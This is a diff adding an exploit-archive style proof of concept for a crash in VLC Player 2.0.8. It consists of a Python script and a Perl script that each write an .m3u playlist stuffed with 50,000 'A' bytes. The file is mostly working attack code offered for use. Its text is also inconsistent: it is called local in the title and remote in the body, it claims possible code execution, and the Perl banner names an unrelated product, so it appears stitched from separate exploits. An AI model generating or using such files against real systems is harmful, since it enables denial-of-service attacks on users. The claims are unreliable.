@@ -1,0 +1,54 @@
+# Exploit Title: VLC Player 2.0.8 <= Local Crash PoC
+# Vendor URI: http://www.videolan.org/vlc/
+# Vendor Description:
+# VLC is a free and open source cross-platform multimedia player
+# and framework that plays most multimedia files as well as DVD,
+# Audio CD, VCD, and various streaming protocols.
+# Tested on: [ Windows 7]
+
+
+VLC Player is prone to a remote denial-of-service vulnerability.
+
+Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed exploit attempts may result in a denial-of-service condition.
+
+VLC Player 2.0.8  is vulnerable; other versions may also be affected. 
+
+
+# !/usr/bin/python
+header="http://"
+poc= "\x41" * 50000
+file = open("asesino04.m3u","w")
+file.write(header+poc)
+file.close()
+-------------------
+#!/usr/bin/perl
+system("title The Black Devils");
+system("color 1e");
+system("cls");
+print "\n\n";               
+print "    |=======================================================|\n";
+print "    |= [!] Name : Easy Icon Maker Version                  =|\n";
+print "    |= [!] Exploit : Crash  Exploit                        =|\n";
+print "    |= [!] Author  : The Black Devils                      =|\n";
+print "    |= [!] Mail: mr.k4rizma(at)gmail(dot)com               =|\n";
+print "    |=======================================================|\n";
+sleep(2);
+print "\n";
+
+# Creating ...
+my $header="http://" ;
+my $PoC = "\x41" x 50000 ;
+open(file , ">", "inj3ct0rs.m3u");
+print file $PoC;
+print "\n [+] File successfully created!\n" or die print "\n [-] OupsS! 
+File is Not Created !! ";
+close(file);
+
+
+
+# Contact :
+------------------
+# Fane Page : www.facebook.com/Th3.Black.D3Vils
+# Youtube : www.youtube.com/user/Th3BlackDevils
+# Facebook : www.facebook.com/DevilsDz
+# Email : mr.k4rizma@gmail.com
